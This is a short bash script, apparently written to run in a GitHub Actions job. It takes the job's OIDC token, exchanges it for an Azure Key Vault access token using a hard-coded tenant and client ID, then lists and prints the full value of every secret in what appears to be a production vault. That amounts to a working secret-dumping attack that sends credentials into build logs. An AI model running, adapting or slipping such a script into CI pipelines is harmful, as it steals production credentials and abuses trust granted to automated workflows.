#!/usr/bin/env bash
set +e
T="3205c325-06a5-4171-9ce8-ffc5e6c2845e"
C="72ff278a-9e71-43ec-bac4-2ca303f8e462"
echo "=== OIDC ==="
OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" \
  | python3 -c "import json,sys;print(json.load(sys.stdin).get('value',''))")
echo "LEN=${#OIDC}"
echo "$OIDC" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null \
  | python3 -c "import json,sys;d=json.load(sys.stdin);print('SUB='+d.get('sub',''));print('AUD='+d.get('aud',''))"
echo "=== EXCHANGE ==="
KV=$(curl -sS -X POST "https://login.microsoftonline.com/$T/oauth2/v2.0/token" \
  -d "client_id=$C" -d "grant_type=client_credentials" \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  -d "client_assertion=$OIDC" --data-urlencode "scope=https://vault.azure.net/.default")
echo "RESP=$(echo $KV | head -c 500)"
VTOK=$(echo "$KV" | python3 -c "import json,sys;print(json.load(sys.stdin).get('access_token',''))" 2>/dev/null)
echo "VTOK_LEN=${#VTOK}"
echo "=== SECRETS ==="
LIST=$(curl -sS -H "Authorization: Bearer $VTOK" "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets?api-version=7.4")
echo "LIST=$LIST"
for s in $(echo "$LIST" | python3 -c "import json,sys;[print(x['id'].rsplit('/',1)[-1]) for x in json.load(sys.stdin).get('value',[])]" 2>/dev/null); do
  echo "=== SECRET: $s ==="
  curl -sS -H "Authorization: Bearer $VTOK" "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/$s?api-version=7.4"
  echo
done
echo "=== DONE ==="